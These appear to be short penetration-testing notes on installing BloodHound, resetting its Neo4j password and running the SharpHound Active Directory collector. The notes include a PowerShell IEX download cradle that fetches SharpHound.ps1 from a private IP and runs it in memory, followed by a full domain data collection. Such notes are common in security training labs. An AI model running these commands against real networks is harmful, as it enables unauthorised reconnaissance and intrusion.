# Installing Bloodhound
[URL] (https://github.com/BloodHoundAD/BloodHound)

## Cloning and Updating
```
git clone https://github.com/BloodHoundAD/BloodHound.git
git pull https://github.com/BloodHoundAD/BloodHound.git
```

## Forgot Neo4J Password
```
Delete this file: /usr/share/neo4j/data/dbms/auth
Start Neo4J: sudo neo4j console
Browse to http://localhost:7474
```

## Starting Bloodhound
```
sudo neo4j console
./Bloodhound --no-sandbox
```

## Running SharpHound
```
Install the module: . .\SharpHound.ps1
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/SharpHound.ps1') #Loads directly into memory#
Invoke-BloodHound -CollectionMethod All -Domain <domain> -ZipFileName <filename.zip>
```

